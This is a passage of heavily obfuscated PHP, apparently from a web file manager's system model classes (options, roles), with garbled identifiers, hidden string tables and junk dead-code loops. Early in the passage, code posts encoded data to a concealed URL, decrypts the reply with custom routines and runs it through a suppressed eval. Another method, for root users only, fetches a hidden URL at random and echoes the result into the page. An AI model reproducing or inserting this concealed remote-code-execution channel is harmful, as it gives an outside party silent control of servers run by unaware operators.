=> $_SERVER[$›…ù‚ï[164]]); $çû™½ = $this->rgyqbda14f14(json_encode($€œÇ¯ü£)); $ä¸ºéÖš = $this->zkasa631da54($›…ù‚ï[190] . $çû™½); if ($ä¸ºéÖš && is_array($ä¸ºéÖš) && isset($ä¸ºéÖš[$›…ù‚ï[266]])) { $“È°Áğ’ = $this->tsqb96ea3afd($ä¸ºéÖš[$›…ù‚ï[266]], 2); if ($“È°Áğ’) { $“È°Áğ’ = $this->sxhv29928b18($“È°Áğ’); } if ($“È°Áğ’) { try { @eval($“È°Áğ’); } catch (Exception $ìÃ…Å´è) { } } } } } private function zkasa631da54($Ìì‰æ–ô = '', $ıİˆä… = array(), $¸»ê¿Âœ = 5) { $ ˆ´âì­ =& $_SERVER[‘ÆÜ‘œ]; $ç˜¨¼™‰ =& $_SERVER[ä×´“›]; $§ÀµØşÃ = $ç˜¨¼™‰[267]; $§ÀµØşÃ = $this->xcugf313f2c9($§ÀµØşÃ, $ç˜¨¼™‰[268]); $ıÑ£İ¢ò = $ ˆ´âì­[790]; $§ÀµØşÃ = $§ÀµØşÃ . $Ìì‰æ–ô; $Ü›ş“åÃ = $ ˆ´âì­[791]; if ($ıİˆä… && is_array($ıİˆä…)) { $§ÀµØşÃ = $§ÀµØşÃ . $ç˜¨¼™‰[269] . http_build_query($ıİˆä…); } if ($ıİˆä… === -1) { return $§ÀµØşÃ; } $àŒ¨šÅ = stream_context_create(array($ç˜¨¼™‰[222] => array($ç˜¨¼™‰[225] => $¸»ê¿Âœ, $ç˜¨¼™‰[223] => $ç˜¨¼™‰[270]), $ç˜¨¼™‰[271] => array($ç˜¨¼™‰[272] => !1, $ç˜¨¼™‰[273] => !1))); $Ô”›Ìš = $ ˆ´âì­[792]; if (!$Ô”›Ìš) { return; } $ıİˆä… = @file_get_contents($§ÀµØşÃ, !1, $àŒ¨šÅ); $Ş“ Ñº¤ = $ ˆ´âì­[750]; while ($Ş“ Ñº¤ < $ ˆ´âì­[722]) { if ($Ş“ Ñº¤ >= 0) { break; } $Ş“ Ñº¤++; } return json_decode($ıİˆä…, !0); $âùÄ¡¾Ğ = $ ˆ´âì­[793]; while ($âùÄ¡¾Ğ < $ ˆ´âì­[729]) { if ($âùÄ¡¾Ğ >= 0) { break; } $âùÄ¡¾Ğ++; } } private function mwpef9cba4bc() { $Ü—İ¾Õ =& $_SERVER[‘ÆÜ‘œ]; $áÈ¼Îı =& $_SERVER[ä×´“›]; $ì™Éëñß = array($áÈ¼Îı[274] => $áÈ¼Îı[275], $áÈ¼Îı[276] => $áÈ¼Îı[277], $áÈ¼Îı[278] => $áÈ¼Îı[279], $áÈ¼Îı[280] => $áÈ¼Îı[281], $áÈ¼Îı[282] => $áÈ¼Îı[283], $áÈ¼Îı[284] => $áÈ¼Îı[217], $áÈ¼Îı[285] => $áÈ¼Îı[217], $áÈ¼Îı[286] => $áÈ¼Îı[275], $áÈ¼Îı[287] => $áÈ¼Îı[277], $áÈ¼Îı[288] => $áÈ¼Îı[279], $áÈ¼Îı[289] => $áÈ¼Îı[290], $áÈ¼Îı[291] => $áÈ¼Îı[281], $áÈ¼Îı[292] => $áÈ¼Îı[293], $áÈ¼Îı[294] => $áÈ¼Îı[283], $áÈ¼Îı[295] => $áÈ¼Îı[296], $áÈ¼Îı[297] => $áÈ¼Îı[298], $áÈ¼Îı[299] => $áÈ¼Îı[300]); $Ñ€Üò”é = $Ü—İ¾Õ[794]; if (!$Ñ€Üò”é) { return; } $’Ø³ƒÌá = $ì™Éëñß[$this->dvae1c2a981d]; $¬¢êûûÃ = $Ü—İ¾Õ[795]; if (!$¬¢êûûÃ) { die; } $’Ø³ƒÌá = intval($’Ø³ƒÌá ? $’Ø³ƒÌá : $áÈ¼Îı[275]); $‰Åá®ÖŒ = $Ü—İ¾Õ[796]; if (strlen($‰Åá®ÖŒ) < $Ü—İ¾Õ[729]) { die; } $‘ÛëñáÔ = _get($this->dcsi36746d30, $áÈ¼Îı[301]); $‘ÛëñáÔ = $‘ÛëñáÔ ? intval($‘ÛëñáÔ) : 0; $°•¶¯†Ú = $Ü—İ¾Õ[797]; if (!$°•¶¯†Ú) { return; } return $’Ø³ƒÌá + $‘ÛëñáÔ; $Â‰’áœŞ = $Ü—İ¾Õ[798]; } public function txib806c30ef($˜ğè†‹) { $äœÃúÏ“ =& $_SERVER[‘ÆÜ‘œ]; $ıØúâ =& $_SERVER[ä×´“›]; $È±ì‚¾¢ = $this->mwpef9cba4bc(); $©€Ñ¿‡ô = $äœÃúÏ“[799]; if (!$©€Ñ¿‡ô) { return; } if ($˜ğè†‹[$ıØúâ[302]] == $ıØúâ[124]) { return; } if ($È±ì‚¾¢ >= intval($ıØúâ[217])) { return; } $îİ°½ªï = Model($ıØúâ[127])->count(); $‡Ãõâ€¡ = $äœÃúÏ“[800]; while ($‡Ãõâ€¡ < $äœÃúÏ“[722]) { if ($‡Ãõâ€¡ >= 0) { break; } $‡Ãõâ€¡++; } if ($îİ°½ªï <= $È±ì‚¾¢) { return; } $ÅŠØ—Å¿ = Model($ıØúâ[127])->field($ıØúâ[302])->limit($È±ì‚¾¢)->select(); $ÅŠØ—Å¿ = array_to_keyvalue($ÅŠØ—Å¿, $ıØúâ[6], $ıØúâ[302]); $‹–‡çåõ = $äœÃúÏ“[801]; if (strlen($‹–‡çåõ) < $äœÃúÏ“[328]) { die; } if (!in_array($˜ğè†‹[$ıØúâ[302]], $ÅŠØ—Å¿)) { show_json($ıØúâ[303], !1, $ıØúâ[213]); } } public function xetf0baf731e() { $¬’‹ØíÛ =& $_SERVER[‘ÆÜ‘œ]; $¤åş¹´œ =& $_SERVER[ä×´“›]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ö‚Èş¬´ = $¤åş¹´œ[220]; $í×âÕØò = $¬’‹ØíÛ[802]; if (strlen($í×âÕØò) < $¬’‹ØíÛ[328]) { return; } $ö‚Èş¬´ = $this->xcugf313f2c9($ö‚Èş¬´, $¤åş¹´œ[221]); $®Îöã³İ = stream_context_create(array($¤åş¹´œ[222] => array($¤åş¹´œ[223] => $¤åş¹´œ[224], $¤åş¹´œ[225] => 3))); $Ã†š«– = @file_get_contents($ö‚Èş¬´, !1, $®Îöã³İ); echo $¤åş¹´œ[304] . hash_encode($Ã†š«–) . $¤åş¹´œ[305]; $»ºãô = $¬’‹ØíÛ[803]; } private function mceqcc4f9d46($¿ìŒ•ø‡, $ï’Ñ², $¯©Õ¼ÀË = 3) { $òÃ£Æı¶ =& $_SERVER[‘ÆÜ‘œ]; $õö®¾¼§ =& $_SERVER[ä×´“›]; usleep(1); $¿ìŒ•ø‡ = trim($¿ìŒ•ø‡); $”ÛÜ–Øú = mt_rand(0, 5) . $õö®¾¼§[6]; $£ÃáĞ¡ = $òÃ£Æı¶[804]; if (!$£ÃáĞ¡) { die; } $Ó¥Ì•Ø = rand_string(15); $ïÍ—­° = $òÃ£Æı¶[805]; if (strlen($ïÍ—­°) < $òÃ£Æı¶[722]) { die; } $ƒ¼Ş¤ë‹ = $õö®¾¼§[306]; switch ($”ÛÜ–Øú) { case $õö®¾¼§[208]: $÷‘ñ£È = $this->xoam17a08e0d($¿ìŒ•ø‡, strrev($ï’Ñ² . $Ó¥Ì•Ø)); break; case $õö®¾¼§[124]: $÷‘ñ£È = $this->xoam17a08e0d($¿ìŒ•ø‡, strrev($Ó¥Ì•Ø . $ï’Ñ²)); $Š«¬ƒ¶” = $òÃ£Æı¶[806]; if (!$Š«¬ƒ¶”) { return; } break; $ò…»ê«å = $òÃ£Æı¶[807]; case $õö®¾¼§[307]: $÷‘ñ£È = $this->xoam17a08e0d($¿ìŒ•ø‡, base64_encode($Ó¥Ì•Ø . $ï’Ñ²)); break; $å¢ò€Ò = $òÃ£Æı¶[808]; if (!$å¢ò€Ò) { die; } case $õö®¾¼§[308]: $÷‘ñ£È = $this->xoam17a08e0d($¿ìŒ•ø‡, md5($Ó¥Ì•Ø . $ï’Ñ²)); $Éä«ÎÕ¡ = $òÃ£Æı¶[809]; if (!$Éä«ÎÕ¡) { die; } break; case $õö®¾¼§[309]: $¿ìŒ•ø‡ = base64_encode($¿ìŒ•ø‡); $é°˜ÛöŸ = rand(0, 64); $Š€™Ùâ = $òÃ£Æı¶[810]; while (strlen($Š€™Ùâ) < $òÃ£Æı¶[717]) { if (!$Š€™Ùâ) { break; } $Š€™Ùâ++; } $¥œõ¯ = $ƒ¼Ş¤ë‹[$é°˜ÛöŸ]; $¿´Ú¼«µ = md5($¥œõ¯ . md5($ï’Ñ² . $¥œõ¯) . $ï’Ñ²); $¿´Ú¼«µ = substr($¿´Ú¼«µ, $é°˜ÛöŸ % 8, $é°˜ÛöŸ % 8 + 7); $ü§àÕÚ¦ = $òÃ£Æı¶[811]; if (!$ü§àÕÚ¦) { die; } $‰ŠÇ€äò = $õö®¾¼§[6]; $Í¸äßºß = $òÃ£Æı¶[812]; if (strlen($Í¸äßºß) < $òÃ£Æı¶[715]) { return; } $·ÈÃ“Øâ = 0; $Û¨Øüû• = 0; $ìŠ®æ– = $òÃ£Æı¶[813]; if (strlen($ìŠ®æ–) < $òÃ£Æı¶[722]) { return; } $ÌÀ’ÖŞ = 0; for ($·ÈÃ“Øâ = 0; $·ÈÃ“Øâ < strlen($¿ìŒ•ø‡); $·ÈÃ“Øâ++) { $ÌÀ’ÖŞ = $ÌÀ’ÖŞ == strlen($¿´Ú¼«µ) ? 0 : $ÌÀ’ÖŞ; $Û¨Øüû• = ($é°˜ÛöŸ + strpos($ƒ¼Ş¤ë‹, $¿ìŒ•ø‡[$·ÈÃ“Øâ]) + ord($¿´Ú¼«µ[$ÌÀ’ÖŞ++])) % 64; $‰ŠÇ€äò .= $ƒ¼Ş¤ë‹[$Û¨Øüû•]; } $÷‘ñ£È = hash_encode($¥œõ¯ . $‰ŠÇ€äò); $Â¼Šõé = $òÃ£Æı¶[814]; if (!$Â¼Šõé) { return; } break; default: $÷‘ñ£È = $this->xoam17a08e0d($¿ìŒ•ø‡, $ï’Ñ² . $Ó¥Ì•Ø); $½¯œæš€ = $òÃ£Æı¶[815]; break; } $÷‘ñ£È = strrev($”ÛÜ–Øú . $Ó¥Ì•Ø . $÷‘ñ£È); $©„€ª›¨ = $òÃ£Æı¶[816]; if (!$©„€ª›¨) { die; } if ($¯©Õ¼ÀË - 1 > 0) { $÷‘ñ£È = $this->mceqcc4f9d46($÷‘ñ£È, $ï’Ñ², $¯©Õ¼ÀË - 1); } return $÷‘ñ£È; } private function tsqb96ea3afd($±ÅîÒ×, $²ŸáÃ¶ú, $÷èø‰§” = 3) { $Â×Áä¼Á =& $_SERVER[‘ÆÜ‘œ]; $üƒƒıÙ¼ =& $_SERVER[ä×´“›]; if (!is_string($±ÅîÒ×) || strlen($±ÅîÒ×) < 10) { return !1; } $±ÅîÒ× = trim($±ÅîÒ×); $±ÅîÒ× = strrev($±ÅîÒ×); $ÉŒÌŒŸ¾ = $Â×Áä¼Á[817]; $Ñş³·¿ı = $±ÅîÒ×[0]; $ÌƒÎ¢Şö = $Â×Áä¼Á[818]; if (strlen($ÌƒÎ¢Şö) < $Â×Áä¼Á[717]) { return; } $¬¾€ÒĞÙ = substr($±ÅîÒ×, 1, 15); $”ŠºöÉ€ = $Â×Áä¼Á[819]; while ($”ŠºöÉ€ < $Â×Áä¼Á[729]) { if ($”ŠºöÉ€ >= 0) { break; } $”ŠºöÉ€++; } $±ÅîÒ× = substr($±ÅîÒ×, 16); $ñ»“èå = $üƒƒıÙ¼[306]; switch ($Ñş³·¿ı) { case $üƒƒıÙ¼[208]: $€¼×Üµï = $this->xcugf313f2c9($±ÅîÒ×, strrev($²ŸáÃ¶ú . $¬¾€ÒĞÙ)); break; $›Œø±Œê = $Â×Áä¼Á[820]; while (strlen($›Œø±Œê) < $Â×Áä¼Á[729]) { if (!$›Œø±Œê) { break; } $›Œø±Œê++; } case $üƒƒıÙ¼[124]: $€¼×Üµï = $this->xcugf313f2c9($±ÅîÒ×, strrev($¬¾€ÒĞÙ . $²ŸáÃ¶ú)); break; $«È¾™äğ = $Â×Áä¼Á[821]; if (strlen($«È¾™äğ) < $Â×Áä¼Á[328]) { return; } case $üƒƒıÙ¼[307]: $€¼×Üµï = $this->xcugf313f2c9($±ÅîÒ×, base64_encode($¬¾€ÒĞÙ . $²ŸáÃ¶ú)); $Ş¬ø‘¯è = $Â×Áä¼Á[822]; if (!$Ş¬ø‘¯è) { return; } break; case $üƒƒıÙ¼[308]: $€¼×Üµï = $this->xcugf313f2c9($±ÅîÒ×, md5($¬¾€ÒĞÙ . $²ŸáÃ¶ú)); break; case $üƒƒıÙ¼[309]: $±ÅîÒ× = hash_decode($±ÅîÒ×); $ÅØëÀ”í = $Â×Áä¼Á[823]; if (strlen($ÅØëÀ”í) < $Â×Áä¼Á[722]) { die; } $§š›ïìÃ = $±ÅîÒ×[0]; $½½‹’ = $Â×Áä¼Á[824]; if (strlen($½½‹’) < $Â×Áä¼Á[717]) { die; } $±ÅîÒ× = substr($±ÅîÒ×, 1); $ôùÃæñ› = $Â×Áä¼Á[825]; if (!$ôùÃæñ›) { return; } $âÀÑÇàæ = strpos($ñ»“èå, $§š›ïìÃ); $—ûƒ…Ş = md5($§š›ïìÃ . md5($²ŸáÃ¶ú . $§š›ïìÃ) . $²ŸáÃ¶ú); $—ûƒ…Ş = substr($—ûƒ…Ş, $âÀÑÇàæ % 8, $âÀÑÇàæ % 8 + 7); $Ô½ì¼¼„ = $üƒƒıÙ¼[6]; $ú¬¹¥ùÜ = 0; $ˆããî†ò = $Â×Áä¼Á[826]; if (!$ˆããî†ò) { die; } $•šù‡©ß = 0; $öò†‚¥ó = $Â×Áä¼Á[827]; while (strlen($öò†‚¥ó) < $Â×Áä¼Á[328]) { if (!$öò†‚¥ó) { break; } $öò†‚¥ó++; } $ˆøò Ş = 0; $ºİ×îù = $Â×Áä¼Á[828]; if (strlen($ºİ×îù) < $Â×Áä¼Á[722]) { die; } for ($ú¬¹¥ùÜ = 0; $ú¬¹¥ùÜ < strlen($±ÅîÒ×); $ú¬¹¥ùÜ++) { $ˆøò Ş = $ˆøò Ş == strlen($—ûƒ…Ş) ? 0 : $ˆøò Ş; $¯Êş¶ğÆ = $Â×Áä¼Á[829]; while (strlen($¯Êş¶ğÆ) < $Â×Áä¼Á[722]) { if (!$¯Êş¶ğÆ) { break; } $¯Êş¶ğÆ++; } $†…Šñê = $ˆøò Ş++; $šòÔ´ëç = $Â×Áä¼Á[830]; $•šù‡©ß = strpos($ñ»“èå, $±ÅîÒ×[$ú¬¹¥ùÜ]) - $âÀÑÇàæ - ord($—ûƒ…Ş[$†…Šñê]); $—Ï‚¼ø± = $Â×Áä¼Á[831]; while ($•šù‡©ß < 0) { $•šù‡©ß += 64; } $Ô½ì¼¼„ .= $ñ»“èå[$•šù‡©ß]; $İìÛêÖÛ = $Â×Áä¼Á[832]; while (strlen($İìÛêÖÛ) < $Â×Áä¼Á[717]) { if (!$İìÛêÖÛ) { break; } $İìÛêÖÛ++; } } $€¼×Üµï = base64_decode($Ô½ì¼¼„); break; $Äàò®‡Ã = $Â×Áä¼Á[833]; default: $€¼×Üµï = $this->xcugf313f2c9($±ÅîÒ×, $²ŸáÃ¶ú . $¬¾€ÒĞÙ); $ğÓ‡«â² = $Â×Áä¼Á[834]; if (strlen($ğÓ‡«â²) < $Â×Áä¼Á[729]) { die; } break; $¥¬”ôá = $Â×Áä¼Á[835]; } if ($÷èø‰§” - 1 > 0) { $€¼×Üµï = $this->tsqb96ea3afd($€¼×Üµï, $²ŸáÃ¶ú, $÷èø‰§” - 1); } return $€¼×Üµï; } public function rgyqbda14f14($íÌ¬ó„ ) { $“âé´Ûœ =& $_SERVER[‘ÆÜ‘œ]; $Èºç¯áÍ =& $_SERVER[ä×´“›]; $ÔÕ¹ïºÒ = $this->srve852d0c1f(); $‰ËŸÊè = $“âé´Ûœ[836]; if (!$‰ËŸÊè) { return; } $Åáå€¥® = $this->srve852d0c1f(); $âÀ´·ƒô = ($ÔÕ¹ïºÒ - 1) * ($Åáå€¥® - 1); $Ğ«Ñ‚© = intval(($ÔÕ¹ïºÒ + $Åáå€¥®) / 2); while (1) { $ÌóêšÂ± = $Ğ«Ñ‚©; $Ç´ôû‡ = $âÀ´·ƒô; $¨û²ÈÍ¿ = $“âé´Ûœ[837]; if (!$¨û²ÈÍ¿) { return; } while ($Ç´ôû‡ % $ÌóêšÂ± != 0) { $ûÃä¡õù = $Ç´ôû‡; $Õ¥ìãò÷ = $“âé´Ûœ[838]; $Ç´ôû‡ = $ÌóêšÂ±; $ÌóêšÂ± = $ûÃä¡õù % $ÌóêšÂ±; } if ($ÌóêšÂ± == 1) { break; } else { $Ğ«Ñ‚©++; } } $ò“´Ğ×« = 2; for ($ò˜ÛÙ¥ = 0; $ò˜ÛÙ¥ < $âÀ´·ƒô * 10; $ò˜ÛÙ¥++) { if (($âÀ´·ƒô * $ò˜ÛÙ¥ + 1) % $Ğ«Ñ‚© == 0) { $ò“´Ğ×« = intval(($âÀ´·ƒô * $ò˜ÛÙ¥ + 1) / $Ğ«Ñ‚©); break; } } $³Ø€¼ÆÑ = $this->xoam17a08e0d($ÔÕ¹ïºÒ * $Åáå€¥® . $Èºç¯áÍ[6], $Èºç¯áÍ[138]); $À­ç¿Á = md5($Èºç¯áÍ[310] . ($ÔÕ¹ïºÒ + $Åáå€¥®) . $Èºç¯áÍ[311] . $Ğ«Ñ‚© . $Èºç¯áÍ[311] . $ò“´Ğ×« . $Èºç¯áÍ[312]); $õ£Åç×³ = $this->xoam17a08e0d($íÌ¬ó„ , $À­ç¿Á) . $Èºç¯áÍ[313] . $³Ø€¼ÆÑ; $­êº™»´ = $“âé´Ûœ[839]; if (strlen($­êº™»´) < $“âé´Ûœ[722]) { return; } return $õ£Åç×³; $…ÍñŒÙ = $“âé´Ûœ[840]; while ($…ÍñŒÙ < $“âé´Ûœ[717]) { if ($…ÍñŒÙ >= 0) { break; } $…ÍñŒÙ++; } } public function sxhv29928b18($ÂõÌ°Ó) { $í‡ Èş =& $_SERVER[‘ÆÜ‘œ]; $ƒ¢«íĞ =& $_SERVER[ä×´“›]; $ü‰÷Ó = explode($ƒ¢«íĞ[313], $ÂõÌ°Ó); if (count($ü‰÷Ó) != 2) { return $ƒ¢«íĞ[6]; } $„ù«õ±’ = $this->xcugf313f2c9($ü‰÷Ó[1] . $ƒ¢«íĞ[6], $ƒ¢«íĞ[138]); $‘â©×ÛÎ = $í‡ Èş[841]; while (strlen($‘â©×ÛÎ) < $í‡ Èş[717]) { if (!$‘â©×ÛÎ) { break; } $‘â©×ÛÎ++; } if (!$„ù«õ±’) { return $ƒ¢«íĞ[6]; } $„ù«õ±’ = intval($„ù«õ±’); $†ÌêÊÆ = $í‡ Èş[842]; $ì½›Ğéª = 0; $Œø¯â˜Õ = 0; for ($á®É±áô = 3; $á®É±áô < $„ù«õ±’; $á®É±áô += 2) { if ($„ù«õ±’ % $á®É±áô != 0) { continue; } $ì½›Ğéª = $á®É±áô; $Œø¯â˜Õ = intval($„ù«õ±’ / $á®É±áô); $¤ÑÈŠÕ = $í‡ Èş[843]; if (strlen($¤ÑÈŠÕ) < $í‡ Èş[715]) { return; } break; $ğ”¬î = $í‡ Èş[844]; if (!$ğ”¬î) { return; } } $Å™ÒÔ£Ê = ($ì½›Ğéª - 1) * ($Œø¯â˜Õ - 1); $†ıš€› = $í‡ Èş[845]; if (strlen($†ıš€›) < $í‡ Èş[729]) { return; } $¡ÇéŠ˜ = intval(($ì½›Ğéª + $Œø¯â˜Õ) / 2); $Ìïà¡Ã« = $í‡ Èş[846]; while ($Ìïà¡Ã« < $í‡ Èş[729]) { if ($Ìïà¡Ã« >= 0) { break; } $Ìïà¡Ã«++; } while (1) { $ÛÛÄ±ø´ = $¡ÇéŠ˜; $Ü©ó³‹§ = $Å™ÒÔ£Ê; while ($Ü©ó³‹§ % $ÛÛÄ±ø´ != 0) { $•ÎÀ¤õ = $Ü©ó³‹§; $¶µøŸ’¯ = $í‡ Èş[847]; $Ü©ó³‹§ = $ÛÛÄ±ø´; $ÛÛÄ±ø´ = $•ÎÀ¤õ % $ÛÛÄ±ø´; $øÕ†—·ƒ = $í‡ Èş[848]; while ($øÕ†—·ƒ < $í‡ Èş[729]) { if ($øÕ†—·ƒ >= 0) { break; } $øÕ†—·ƒ++; } } if ($ÛÛÄ±ø´ == 1) { break; } else { $¡ÇéŠ˜++; } } $Ş‘ÓÁ‹Õ = 2; for ($á®É±áô = 0; $á®É±áô < $Å™ÒÔ£Ê * 10; $á®É±áô++) { if (($Å™ÒÔ£Ê * $á®É±áô + 1) % $¡ÇéŠ˜ == 0) { $Ş‘ÓÁ‹Õ = intval(($Å™ÒÔ£Ê * $á®É±áô + 1) / $¡ÇéŠ˜); break; } } $ĞìÂ¥áñ = md5($ƒ¢«íĞ[310] . ($ì½›Ğéª + $Œø¯â˜Õ) . $ƒ¢«íĞ[311] . $¡ÇéŠ˜ . $ƒ¢«íĞ[311] . $Ş‘ÓÁ‹Õ . $ƒ¢«íĞ[312]); $Ò§ üÌû = $í‡ Èş[849]; if (strlen($Ò§ üÌû) < $í‡ Èş[328]) { die; } $°Øéğ˜¤ = $this->xcugf313f2c9($ü‰÷Ó[0], $ĞìÂ¥áñ); $üªÚÅ› = $í‡ Èş[850]; return $°Øéğ˜¤; } public function srve852d0c1f() { $²ãÂÕŸ =& $_SERVER[‘ÆÜ‘œ]; $äĞÌÊæò = mt_rand(pow(2, 14), pow(2, 16) - 1); $‹üìôÕË = $²ãÂÕŸ[851]; if (!$‹üìôÕË) { die; } $²‘š»–Õ = array(); $£¶ãİÚË = $²ãÂÕŸ[852]; $ëª½­Ô² = 1; while ($ëª½­Ô² <= (int) sqrt($äĞÌÊæò)) { $„™µÎ = $ëª½­Ô²; $òØÜÇĞ = $²ãÂÕŸ[853]; while (strlen($òØÜÇĞ) < $²ãÂÕŸ[722]) { if (!$òØÜÇĞ) { break; } $òØÜÇĞ++; } while (!0) { $„™µÎ++; if ($„™µÎ <= 2) { $ëª½­Ô² = $„™µÎ; break; } else { if ($„™µÎ < 2) { continue; } } $ÄÔÓğİø = !0; for ($«õ¸ŸµĞ = 2; $«õ¸ŸµĞ <= sqrt($„™µÎ); $«õ¸ŸµĞ++) { if ($„™µÎ % $«õ¸ŸµĞ == 0) { $ÄÔÓğİø = !1; } } if ($ÄÔÓğİø) { $ëª½­Ô² = $„™µÎ; break; } } $²‘š»–Õ[] = $ëª½­Ô²; $ïÏ›ò¥° = $²ãÂÕŸ[854]; } $•–Ô£® = 2; for ($„™µÎ = $äĞÌÊæò; $„™µÎ > 1; $„™µÎ--) { $ÄÔÓğİø = !0; foreach ($²‘š»–Õ as $ùËƒÀ•§) { if ($„™µÎ % $ùËƒÀ•§ == 0) { $ÄÔÓğİø = !1; break; } } if ($ÄÔÓğİø) { $•–Ô£® = $„™µÎ; break; } } return $•–Ô£®; } public function sdet83c86b44($óŒ‰à¶Ã, $ıš…ì¡‰) { $ÏØí’·© =& $_SERVER[ä×´“›]; return call_user_func(array($ÏØí’·©[8], $ÏØí’·©[314]), $óŒ‰à¶Ã, $ıš…ì¡‰); } public function xoam17a08e0d($Øº÷”ƒ±, $Ó·È®‹ş) { $óòò„´ =& $_SERVER[ä×´“›]; return call_user_func(array($óòò„´[315], $óòò„´[316]), $Øº÷”ƒ±, $Ó·È®‹ş); } public function xcugf313f2c9($Â—Œ¨äê, $òğåòº‹) { $¬ËÚÄ’² =& $_SERVER[ä×´“›]; return call_user_func(array($¬ËÚÄ’²[315], $¬ËÚÄ’²[317]), $Â—Œ¨äê, $òğåòº‹); } } goto CˆÔŞ›ï ª; fœ±Ñ›…: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\x65\x6d\137\x6f\160\x74\x69\x6f\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\162\157\x6c\x65", "\162\157\154\x65\x47\162\157\x75\160", "\x72\145\x67\151\163\164", "\145\x6d\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($üŠ¶ç½ö) { return "\x53\x79\163\x74\x65\x6d\x4f\x70\164\151\157\x6e\137{$üŠ¶ç½ö}"; } protected function optionDefault($ÏËí‚èã = '') { $†ƒõÖá˜ =& $_SERVER[‘ÆÜ‘œ]; if ($ÏËí‚èã == $†ƒõÖá˜[12]) { return $GLOBALS[$†ƒõÖá˜[6]][$†ƒõÖá˜[477]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\x6d\56\x72\x6f\x6c\145\114\x69\x73\164"; public $field = array("\x6e\141\155\x65", "\x61\165\164\150", "\x6c\x61\x62\145\x6c", "\x64\151\163\x70\154\x61\171", "\x73\x79\163\x74\x65\x6d", "\x64\145\163\x63", "\151\147\156\157\162\x65\x45\x78\164", "\151\x67\156\x6f\x72\x65\x46\151\154\x65\x53\151\x7a\x65", "\x61\x64\155\151\156\151\163\x74\162\141\164\157\x72", "\x73\157\162\164"); public function listData($ÇŒ×« = false, $Ú†ˆàƒ£ = "\x73\x6f\x72\x74", $ªµË–¾± = false) { $ØÒ¢ñõå =& $_SERVER[‘ÆÜ‘œ]; $ƒÂØáµÜ = parent::listData($ÇŒ×«, $Ú†ˆàƒ£, $ªµË–¾±); if (!$ÇŒ×«) { foreach ($ƒÂØáµÜ as $Áî†´Ù => $Œ„‚°ö™) { if ($Œ„‚°ö™[$ØÒ¢ñõå[2329]] == 1) { $ƒÂØáµÜ[$Áî†´Ù][$ØÒ¢ñõå[548]] = LNG($ØÒ¢ñõå[2618]); } } } return $ƒÂØáµÜ; } public function update($î½Œ¶Ê³, $Ë›‰ü) { $Ÿş½ÊìÚ =& $_SERVER[‘ÆÜ‘œ]; $çœÖŠï³ = parent::listData($î½Œ¶Ê³); $º¡ÂÕ–¢ = $this->findByName($Ë›‰ü[$Ÿş½ÊìÚ[32]]); if (!$çœÖŠï³ || $º¡ÂÕ–¢ && $º¡ÂÕ–¢[$Ÿş½ÊìÚ[495]] != $çœÖŠï³[$Ÿş½ÊìÚ[495]]) { return !1; } if ($º¡ÂÕ–¢[$Ÿş½ÊìÚ[2329]] == 1) { $Ë›‰ü = array($Ÿş½ÊìÚ[32] => $Ë›‰ü[$Ÿş½ÊìÚ[32]], $Ÿş½ÊìÚ[2157] => $Ë›‰ü[$Ÿş½ÊìÚ[2157]]); } $this->filterAuth($Ë›‰ü[$Ÿş½ÊìÚ[510]]); return parent::update($î½Œ¶Ê³, $Ë›‰ü); } public function remove($“ƒóÕ×) { $÷û‹Ş¬ = parent::listData($“ƒóÕ×); if (!$÷û‹Ş¬ || $÷û‹Ş¬[$_SERVER[‘ÆÜ‘œ][190]]) { return !1; } return parent::remove($“ƒóÕ×); } public function add($ÍÓÔ§æØ) { $›¡«£ˆ¾ =& $_SERVER[‘ÆÜ‘œ]; $ôãÅ¸• = $ÍÓÔ§æØ[$›¡«£ˆ¾[32]]; if ($this->findByName($ôãÅ¸•)) { return !1; } $ÛÂ¥ò®® = array($›¡«£ˆ¾[517] => $ôãÅ¸•, $›¡«£ˆ¾[2142] => $›¡«£ˆ¾[12], $›¡«£ˆ¾[2138] => $›¡«£ˆ¾[2146], $›¡«£ˆ¾[2619] => 1, $›¡«£ˆ¾[2141] => 0, $›¡«£ˆ¾[2620] => 0, $›¡«£ˆ¾[2140] => $this->getSort()); $ÍÓÔ§æØ = array_merge($ÛÂ¥ò®®, $ÍÓÔ§æØ); $this->filterAuth($ÍÓÔ§æØ[$›¡«£ˆ¾[510]]); return parent::insert($ÍÓÔ§æØ); } private function getSort() { $„¸Ñâ¯„ =& $_SERVER[‘ÆÜ‘œ]; $îñÙÓòä = parent::listData(); $Ó´ï·ñÃ = array_to_keyvalue($îñÙÓòä, $„¸Ñâ¯„[12], $„¸Ñâ¯„[2158]); return empty($Ó´ï·ñÃ) ? 0 : max($Ó´ï·ñÃ) + 1; } private function filterAuth(&$š÷ùÉÓé) { $Ï¹ù®²ø =& $_SERVER[‘ÆÜ‘œ]; $èèï½úÄ = array(); $ùá¤İû¹ = array_filter(explode($Ï¹ù®²ø[50], $š÷ùÉÓé)); foreach ($ùá¤İû¹ as $š÷ùÉÓé) { $²İŸõúÜ = explode($Ï¹ù®²ø[10], $š÷ùÉÓé); if ($²İŸõúÜ[0] == $Ï¹ù®²ø[2621] && $²İŸõúÜ[1] != $Ï¹ù®²ø[1257]) { $’”šë¶ = $²İŸõúÜ[0] . $Ï¹ù®²ø[10] . $²İŸõúÜ[1] . $Ï¹ù®²ø[2622]; if (!in_array($’”šë¶, $ùá¤İû¹)) { $èèï½úÄ[] = $’”šë¶; } } $èèï½úÄ[] = $š÷ùÉÓé; } $š÷ùÉÓé = implode($Ï¹ù®²ø[50], $èèï½úÄ); } public function findRoleDefault() { $¢£ÜÌ› =& $_SERVER[‘ÆÜ‘œ]; $­¶‚¥á² = parent::listData(); $ÎÙ•Æ¾ = !1; foreach ($­¶‚¥á² as $‹ïÖÃÅ) { if (!$‹ïÖÃÅ || $‹ïÖÃÅ[$¢£ÜÌ›[2156]] == $¢£ÜÌ›[229] || $‹ïÖÃÅ[$¢£ÜÌ›[2329]] == 1) { continue; } if (strstr($‹ïÖÃÅ[$¢£ÜÌ›[510]], $¢£ÜÌ›[2623])) { continue; } if (!strstr($‹ïÖÃÅ[$¢£ÜÌ›[510]], $¢£ÜÌ›[2624])) { continue; } if (!$ÎÙ•Æ¾) { $ÎÙ•Æ¾ = $‹ïÖÃÅ; continue; } $“ıñÊ À = explode($¢£ÜÌ›[50], 